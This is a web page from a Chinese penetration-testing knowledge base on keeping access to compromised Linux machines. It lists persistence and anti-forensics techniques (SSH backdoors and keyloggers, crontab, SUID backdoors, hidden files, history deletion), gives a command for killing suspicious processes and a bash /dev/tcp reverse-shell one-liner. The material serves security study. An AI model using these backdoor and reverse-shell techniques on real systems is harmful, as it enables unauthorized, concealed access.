<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/权限维持/Linux权限维持" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Linux权限维持 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/权限维持/Linux权限维持"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux权限维持 | d4m1ts 知识库"><meta data-rh="true" name="description" content="自我总结"><meta data-rh="true" property="og:description" content="自我总结"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/权限维持/Linux权限维持"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/权限维持/Linux权限维持" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/权限维持/Linux权限维持" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"权限维持","item":"https://blog.gm7.org/docs/渗透测试/权限维持/"},{"@type":"ListItem","position":3,"name":"Linux权限维持","item":"https://blog.gm7.org/docs/渗透测试/权限维持/Linux权限维持"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.30bbfbd6.js" defer="defer"></script>
<script src="/assets/js/main.c788ee5b.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="展开侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="折叠侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/Windows权限提升">Windows权限提升</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/Linux权限提升">Linux权限提升</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/Windows权限维持">Windows权限维持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/权限维持/Linux权限维持">Linux权限维持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/权限维持/扩展">扩展</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/权限维持/"><span>权限维持</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Linux权限维持</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux权限维持</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="自我总结">自我总结<a href="#自我总结" class="hash-link" aria-label="自我总结的直接链接" title="自我总结的直接链接">​</a></h2>
<p><strong>直接权限维持</strong></p>
<ul>
<li>反弹shell</li>
<li>SSH<!-- -->
<ul>
<li>SSH warpper</li>
<li>SSH 软连接</li>
<li>SSH 公钥免密登陆</li>
<li>SSH Keylogger</li>
<li>strace监听ssh来源流量</li>
</ul>
</li>
<li>Crontab</li>
<li>vim后门</li>
<li>开机启动项 （自己想的不知道可不可以）</li>
<li><code>.bashrc</code> （自己想的不知道可不可以）</li>
<li>添加超级用户</li>
<li>SUID后门</li>
</ul>
<p><strong>间接辅助权限维持</strong></p>
<ul>
<li>cat缺陷</li>
<li>Linux/Unix 隐藏文件和文件夹</li>
<li>参数混淆拦截rm</li>
<li>删除/隐藏历史操作命令</li>
</ul>
<p><img decoding="async" loading="lazy" src="/assets/images/158234181991067624646-3753306fff6c32e7fe7c931735b2a4de.jpg" width="1080" height="976" class="img_ev3q"></p>
<p>拿到机器后可以查看一下有没有相关程序，反弹shell等进程能够被查到，这条命令可以简单的kill掉一些常见恶意程序。</p>
<p>批量kill可疑进程：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-ef</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;python&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">awk</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;{print $2}&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">xargs</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">kill</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-9</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-ef</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;bash -i&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">awk</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;{print $2}&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">xargs</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">kill</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-9</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-ef</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ew&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">awk</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;{print $2}&#x27;</span><span class="token operator" style="color:#393A34">|</span><span class="token function" style="color:#d73a49">xargs</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">kill</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-9</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux反弹shell">LINUX反弹shell<a href="#linux反弹shell" class="hash-link" aria-label="LINUX反弹shell的直接链接" title="LINUX反弹shell的直接链接">​</a></h2>
<p>关于反弹原理，和每一步的数据流向在网上都有文章，就不复制了。这里只是用来总结下常规反弹shell的用法，顺便说下优点缺点。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">bash</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&amp;</span><span class="token plain"> /dev/tcp/127.0.0.1/6666 </span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token file-descriptor important">&amp;1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,UklGRgAfAABXRUJQVlA4IPQeAADQfgCdASo4BFwAPm02lkikIyIhI3TaAIANiWlu8p+3/cJTv9nFALFnHi+cnFXcdrk+P/yPWxuEXEL9R/OH4afavx488/xj5z/Hf2zz7sofo/8z5mfyn7qfvv8D50/7X/FeLPwl/vfUF/I/5n/sf7R6230faJaz/kvQC9mPqf/c/yXivf6/+D9U/zv+0f9/+7/AD/K/7V/0fVz/N+CL91/z//Z/2PwBf0D+5f9T/Fe6r/df/j/fegn9G/1v7Z/AN/O/7/1w/SYGjiUlcPjgxmJ8usN7bzo0vK3F2THp6n/2YMeUVnIdfOSMr3qM5HLca9HtrlfBBIPRQyqNH168iiX/q4Ur9caX5t3n2k6p8xlbB3OiVwy88lVWWPkOTkhN2iTE+tuHCitBgiY9IK1cJfR6z80L3/iT7ryMkotxIKWGx/o4Mnoah+ZjpEF65fbrd3UHd3d3d3d3b/AW2DKcv/OFxj2E8YYQuKQuiCW/gNaYyRUMFNPWx8zATt/4DG3yqTynskjtFkQalFFfdJtNiyLgq41lZ0q3k76RKNJygOKu6ZkwW3XdCqwLjW0yCU+SyUlm0EelZGcCfYTkZgigm/5mEZSdpyI/W/IzCa/BmWvIXyfMqt95O3d2m6BdKNdkREREREREREREREREREREREREVEjMUU+fnLMlT3oD4I2e4KWVVK2raGSrr0gDIfb6d/d+tv12wsC6QEezVPNsjGxH4Q57Dd94TO4q/niaTvNrfSeQev0LeLez/rNJ4JIzEi6Mkl9dYr1OzMXKOXOEmZmZmZmZmZmZmZmZmZmZmZmZmY/NPSzj1Ns5zZ1VTLJqDKcFDj9rdWnbRALHgrBEH4loqAQa0/SHV3B100x+6sjAAZ98zUzj3P2XcqUo4+4l5r8Pe4lzX6w+ZOOLP13yb+f4o9p0TeKbOe+2IXlApsqgWwR9dDO4Lcl3Pr05g2nGWFT1D4pmZmZmZmZmZmZmZmZmZmZmZmZmZKgML35kPmlOnNZctTDu5oG0FKrOL1i04RxESUd9oQyO4+s8bbR3cNI5RSB04EEXMPFsi7T+Zmu1rWt45u7u7u7u7u7u7u7u7u7u7u7u7u7u7NoarwKfwatlUVhr13E1l+ygPBZOeR1L1fJ/9iQT29PLNbhbP5bsSI97z0t53o5oSGZ1/2yYfBGXcRrgk2E2vPUOvUDGBqYbWrgjkBou1svy0ugVeNnR5Gicx6rfElOYZmZmZmZmZmZmZmZmZmZmZmZmZkNbpdmuCVkADQvnHntz6gzc5oONnYzcpettQvqdeDYd7aKxPfrxtO9plT5gsW6sWB6cTWrgenL8GCRntTEVanc1ADdjTlQAvcHFuwcQnIdpmZmZl2AA/vUFxY84s4r1QMCERK7JYoX9699ruoA6K6VB76mBAuhYxhIc2FdySoxGEtmTFuVkZOcI0yx5X1tTZHft31RKa3AUoScbm1K9XrlOd53y6m/ZBaKNyVXmjpTt/jNG71JIS+wUpvoxEcWBwwa64j8QreAhhjkcVZDf4KKaHAa5BYmuMecyUljUD/Q9QZi1M+UQvTZpkqJ1QPhhY159yCbxofZsnwS0yKFonSWPNzHHTKhfvp0kmjJWym+sI2vV0bIkze4PTH06IWzDuSi0GZeE6fCnNnPPKd3qp/Va3toiaY4O8ncBx9unanEjqe/EBVZmCR9t5nxw85TimQgoZPmUsIqZFt4nv86u9saSkidbtv13Hof6OkPYMzXHyat2/EG8eim3Omi7/qqW0WzY9aav4Y0Jz+SKemRaF8eMfKmrWxMzUmKniLyf5TwKRWeu5tG5QN1SaxivpT2KncqUfCt3ZASJmrkishx2G22Byowh0t3szgG6KaOzxo1nsCHZM/4dsB2cfeTWPFw/lUQOcOiTyzG4A7PvTL7McTe4KDAH/rzJSdcEiJ/LASSGoANElgtzE78McMN1fnCPe+DLAur2HMIPr+JghmSZx3ZNfNQnWRFvuE+lD22e6BOtlzvr+BpxKpv3L6eGmG5CH8CSsOtZkvE81N7fAqiuXGAVu+2wYriYqWUFa3+QpOEPvgERtcw1+XRvwOAX9FyAo2oVl0DK7uyh9uqlvJbODat9/jYVpeKUBQY/3w6w4hJrcZsNykYMEI+UyXEbi7qG4/nBP1lOMnqzCmXt3uCSir19BlEKApiEnb8qkWRBtxNOk9aKV/KHyed+4wEV5IL1YUd3wOOUTYqChuAq5HYzOQ6nrRHotbs2DKXY2VXj7UVAEG2k1NPUXtgWelg5M/5MZOHP7LzDbkiDf1GivSrg707lPrj/RCyOevgAAv0FVXPwBxA/dtWUUCLrvvpogVD95Kkt+h1ND+TCB1IiRP+W0CcJ6qQA60Qghd28IADxN+zF/kBvPdC82lRi/cUBw7dqmtqRuBJ1qx5rd/WynQPP3tZ23uXaoXg5ICPcE40VBUupiBQTy3jGOgQBUB7WQ/LOEe8DyWT75G7q2J7JfeKnIKAlrYX0xOyvUWQLm1N1L7EKJwF/Br4bJ3v8VkJ9Q3XbT6NYMderwWePD0Rmkkr21W7c9EuHVRTHGiJzJ8K0MrrFMVV3XbCrkEQhLmNqjr2VSsNnbjRfVIyig28xsSObI9FaV5ydqrdGLq6DXIwUGT/S+ifCX5R2d9gK/bVJcHsrZkJDuT5pDVEK5PTJMF3GwRQqFkxoel3XoKwm0ktZCkxEjsetcEKyO+rChIDEizHm7gzZuNyeevLo3qlVMTw1iez4uEl8wPuZhKjZ5fzDxtsEcAKYxghoPVS7g5yniAR7B3SsiiaZ9lYuW/RcJVvWx3rpyy/AFRotO7YiGnq5AwxpeypxC6rHVkJnTpL8fDS2Fb9ft0ittS37blCSaGxB/TV9kh8CPsNX04sHSVoht/2nIlvtYVeS7sCu9hwPuW/TONw1ClJXeFZqGGq1SyAJEihoiC5u78CCqp9bS+m3RPr5JSVxqIfXvjBfpDRVMZezkapy4ZnWpBAxJ6yrrk7cCKpYi0XLV+5VBOsbj7/vYR+vfRh0VRRNtHvwShuhNyEMn494zBfbJZuGZJ6nOGpOi03AB4CixAl8oZRy+aHRV5SJRdBurMlsd8/z784aIxDMzueW9pyFrK+x31s6Hv0zWycTTFD/aD/Kh+DqJFVXc+f6XUy4a+jCH3oy5LOQz7PemJwqde3hSoBaYgkp3yOdVwWDxV5GMqvH4hQXHzbCaIOHPVWH6Hm6gbdO/